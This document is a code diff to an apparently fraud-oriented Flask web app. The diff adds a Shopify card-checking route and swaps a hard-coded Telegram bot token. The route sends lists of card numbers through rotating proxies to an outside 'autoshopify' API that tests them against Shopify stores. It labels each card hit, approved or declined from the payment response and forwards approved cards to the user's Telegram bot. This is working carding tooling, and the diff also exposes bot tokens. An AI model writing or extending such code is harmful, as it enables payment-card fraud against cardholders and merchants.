@@ -51,7 +51,7 @@ def init_db():
 init_db()
 
 # Telegram Bot Setup
-TELEGRAM_BOT_TOKEN = "8320534432:AAFPzKpzxWMAPS7aBBYmW-MuOPnOYvxPDOc"
+TELEGRAM_BOT_TOKEN = "8375805927:AAHYRfKe55Yb1jenqkT9mHkOAPmsl95pKfs"
 bot = telebot.TeleBot(TELEGRAM_BOT_TOKEN)
 
 # Store results temporarily
@@ -580,6 +580,142 @@ def clear_results():
             results[session_id] = []
     return jsonify({'success': True})
 
+@app.route('/shopify')
+def shopify_check():
+    if 'user_id' not in session or 'access_key' not in session:
+        return redirect(url_for('login'))
+    return render_template('shopify.html', username=session.get('username'), credits=session.get('credits', 0))
+
+@app.route('/shopify_check', methods=['GET', 'POST'])
+def shopify_check_process():
+    if 'user_id' not in session or 'access_key' not in session:
+        return jsonify({'error': 'Authentication required'}), 401
+    
+    # Handle both GET (from EventSource) and POST (from form) requests
+    if request.method == 'POST':
+        # Get form data
+        sites = request.form.get('sites', '').strip().split('\n')
+        proxies = request.form.get('proxies', '').strip().split('\n')
+        cards = request.form.get('cards', '').strip().split('\n')
+    else:  # GET request from EventSource
+        sites = request.args.get('sites', '').strip().split('\n')
+        proxies = request.args.get('proxies', '').strip().split('\n')
+        cards = request.args.get('cards', '').strip().split('\n')
+    
+    # Clean up empty lines
+    sites = [site.strip() for site in sites if site.strip()]
+    proxies = [proxy.strip() for proxy in proxies if proxy.strip()]
+    cards = [card.strip() for card in cards if card.strip()]
+    
+    if not sites or not cards:
+        return jsonify({'error': 'Sites and cards are required'}), 400
+    
+    # Prepare for streaming response
+    def generate():
+        for i, card in enumerate(cards):
+            # Select a random site
+            site = random.choice(sites) if sites else ""
+            
+            # Select a random proxy if available
+            proxy = random.choice(proxies) if proxies else None
+            
+            # Prepare proxy dict if available
+            proxy_dict = None
+            if proxy:
+                proxy_parts = proxy.split(':')
+                if len(proxy_parts) == 4:
+                    ip, port, username, password = proxy_parts
+                    proxy_dict = {
+                        'http': f'http://{username}:{password}@{ip}:{port}',
+                        'https': f'http://{username}:{password}@{ip}:{port}'
+                    }
+                elif len(proxy_parts) == 2:
+                    ip, port = proxy_parts
+                    proxy_dict = {
+                        'http': f'http://{ip}:{port}',
+                        'https': f'http://{ip}:{port}'
+                    }
+            
+            # Prepare the API URL
+            api_url = f"https://autoshopify-dark.sevalla.app/index.php?site={site}&cc={card}"
+            if proxy:
+                api_url += f"&proxy={proxy}"
+            
+            try:
+                # Make the request
+                response = requests.get(api_url, proxies=proxy_dict, timeout=30)
+                data = response.json()
+                
+                response_upper = data.get('Response', '').upper()
+                price = data.get('Price', 'N/A')
+                gateway = data.get('Gateway', 'N/A')
+                if 'THANK YOU' in response_upper or 'INSUFFICIENT' in response_upper:
+                    bot_response = data.get('Response', 'Unknown')
+                    status = 'HIT'
+                
+                elif '3D' in response_upper or 'OTP' in response_upper:
+                    bot_response = data.get('Response', 'Unknown')
+                    status = 'APPROVED'
+                elif any(x in response_upper for x in ['INCORRECT_CVC', 'INCORRECT_ZIP', 'CVV', 'ZIP']):
+                    bot_response = data.get('Response', 'Unknown')
+                    status = 'APPROVED'
+                elif 'EXPIRED_CARD' in response_upper:
+                    bot_response = 'EXPIRE_CARD'
+                    status = 'EXPIRED'
+                else:
+                    bot_response = data.get('Response', 'Unknown')
+                    status = 'DECLINED'
+                
+                # Send approved cards to user's bot
+                if status in ['APPROVED', 'APPROVED_OTP']:
+                    try:
+                        send_card_to_user_bot(
+                            session['user_id'],
+                            {
+                                'card': card,
+                                'status': status,
+                                'response': bot_response,
+                                'gateway': 'SHOPIFY',
+                                'bin': {},
+                                'timestamp': datetime.now().strftime("%H:%M:%S"),
+                                'amount': price
+                            }
+                        )
+                    except Exception as bot_error:
+                        print(f"Bot notification failed: {bot_error}")
+                
+                # Send result via SSE
+                result_data = {
+                    'card': card,
+                    'status': status,
+                    'response': bot_response,
+                    'gateway': gateway,
+                    'amount': price,
+                    'site': site,
+                    'proxy': proxy or 'None'
+                }
+                
+                yield f"data: {json.dumps(result_data)}\n\n"
+                
+            except Exception as e:
+                error_data = {
+                    'card': card,
+                    'status': 'ERROR',
+                    'response': f'Request failed: {str(e)}',
+                    'gateway': 'SHOPIFY',
+                    'amount': 'N/A',
+                    'site': site,
+                    'proxy': proxy or 'None'
+                }
+                yield f"data: {json.dumps(error_data)}\n\n"
+            
+            # Small delay between requests
+            time.sleep(0.5)
+        
+        # Send completion message
+        yield f"data: {json.dumps({'complete': True})}\n\n"
+    
+    return Response(stream_with_context(generate()), mimetype='text/event-stream')
 
 @app.route('/gen', methods=['GET', 'POST'])
 def gen_card():
